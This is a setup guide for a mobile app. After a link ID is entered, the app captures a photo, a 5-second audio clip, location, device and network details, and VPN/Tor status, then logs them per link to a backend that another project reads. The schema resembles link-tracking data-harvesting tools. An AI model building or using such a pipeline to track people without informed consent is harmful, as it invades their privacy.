# Complete Flow - ID 527932

## Overview

When you enter **527932** (or any valid pageId), the app will:
1. ✅ Check if ID exists in database
2. ✅ Show all permission requests
3. ✅ Capture image and audio
4. ✅ Upload to Cloudinary
5. ✅ Save all data to database

## Setup Steps

### 1. Install Dependencies

```bash
cd frontend
npm install
```

This installs:
- `expo-device`
- `expo-application`
- `expo-network`
- `expo-av` (for audio recording)

### 2. Configure External Backend URL

Edit `frontend/config/api.ts`:

```typescript
export const API_BASE_URL = 'https://your-external-backend-url.com';
```

**Important:** Replace with your actual external backend URL where ID "527932" exists.

### 3. Ensure Backend Has Cloudinary Setup

Your external backend needs:
- Cloudinary configuration
- `POST /api/links/:id/capture` endpoint for uploading files
- `POST /api/links/:id/logs` endpoint for saving log data

## Complete Flow

### Step 1: Enter ID
- User enters **527932** in the input field
- Clicks "Proceed to Permissions"

### Step 2: Verify ID
- App calls `GET /api/links/527932`
- If ID exists → Proceed to permissions screen
- If ID not found → Show error alert

### Step 3: Request Permissions
- User sees all permission buttons:
  - Contacts
  - Notifications
  - Media / Gallery
  - Camera
  - Location
  - Microphone
- User can grant/deny each permission

### Step 4: Capture & Save
- User clicks **"Capture & Save All Data"** button
- App automatically:
  1. Requests camera permission (if not granted)
  2. Requests microphone permission (if not granted)
  3. Captures photo (if camera granted)
  4. Records 5 seconds of audio (if microphone granted)
  5. Uploads image to Cloudinary via backend
  6. Uploads audio to Cloudinary via backend
  7. Collects all device/network/permission data
  8. Gets location (if permission granted)
  9. Saves everything to database

### Step 5: Data Saved
- All data is saved to MongoDB via `POST /api/links/527932/logs`
- Cloudinary URLs are stored in `captures.image` and `captures.audio`
- Your other project can fetch this data from the same database

## Data Structure Saved

```json
{
  "timestamp": "2024-01-20T12:00:00.000Z",
  "request": {
    "ip": "192.168.1.1",
    "rawIp": "192.168.1.1",
    "referrer": "",
    "userAgent": "Mobile App - iPhone 15 Pro"
  },
  "device": {
    "browser": "Mobile App",
    "os": "iOS 17.0",
    "device": "iPhone 15 Pro",
    "deviceVendor": "Apple",
    "deviceType": "PHONE"
  },
  "clientData": {
    "os": "iOS 17.0",
    "device": "iPhone 15 Pro",
    "deviceVendor": "Apple",
    "deviceType": "PHONE",
    "isPhysicalDevice": true,
    "appVersion": "1.0.0",
    "buildVersion": "1",
    "networkType": "WIFI",
    "isConnected": true,
    "permissions": {
      "contacts": "granted",
      "notifications": "granted",
      "media": "granted",
      "location": "granted",
      "camera": "granted",
      "microphone": "granted"
    }
  },
  "network": {
    "ip": "192.168.1.1",
    "location": {
      "latitude": "37.7749",
      "longitude": "-122.4194",
      "city": "",
      "region": "",
      "country": "",
      "continent": "",
      "region_code": "",
      "country_code": "",
      "continent_code": "",
      "time_zone": "",
      "locale_code": "",
      "metro_code": "",
      "is_in_european_union": false
    },
    "network": {
      "network": "WIFI",
      "autonomous_system_number": "",
      "autonomous_system_organization": ""
    },
    "security": {
      "vpn": false,
      "proxy": false,
      "tor": false,
      "relay": false
    },
    "is_private": true
  },
  "captures": {
    "image": "https://res.cloudinary.com/your-cloud/image/upload/...",
    "audio": "https://res.cloudinary.com/your-cloud/video/upload/..."
  }
}
```

## Required Backend Endpoints

### 1. Check Link Exists
```
GET /api/links/:id
```
Returns link data if exists, 404 if not found.

### 2. Upload to Cloudinary
```
POST /api/links/:id/capture
Content-Type: multipart/form-data
Body: { file: File, type: 'image' | 'audio' }
```
Returns: `{ success: true, url: "cloudinary-url" }`

### 3. Save Log Data
```
POST /api/links/:id/logs
Content-Type: application/json
Body: { ...logData }
```
Saves complete log entry to database.

## Testing

1. **Start Frontend:**
   ```bash
   cd frontend
   npm run dev
   ```

2. **Enter ID:** Type **527932** and click "Proceed to Permissions"

3. **Grant Permissions:** Click each permission button to grant access

4. **Capture & Save:** Click "Capture & Save All Data" button

5. **Verify:** Check your database to see the saved log entry with Cloudinary URLs

## Troubleshooting

### "ID not found in database"
- Verify ID "527932" exists in your external backend database
- Check that `GET /api/links/527932` endpoint works

### "Error uploading to Cloudinary"
- Verify your backend has Cloudinary configured
- Check `POST /api/links/:id/capture` endpoint is working
- Verify Cloudinary credentials are set in backend

### "Error saving data"
- Check `POST /api/links/:id/logs` endpoint exists
- Verify database connection is working
- Check backend logs for errors

### Camera/Audio not capturing
- Ensure permissions are granted before clicking "Capture & Save"
- Check device supports camera/microphone
- Verify `expo-av` and `expo-camera` are installed

## Next Steps

After data is saved:
- Your other project can query the same MongoDB database
- Fetch link by pageId: `GET /api/links/527932`
- Display all logs with Cloudinary URLs
- Show device info, location, permissions, etc.
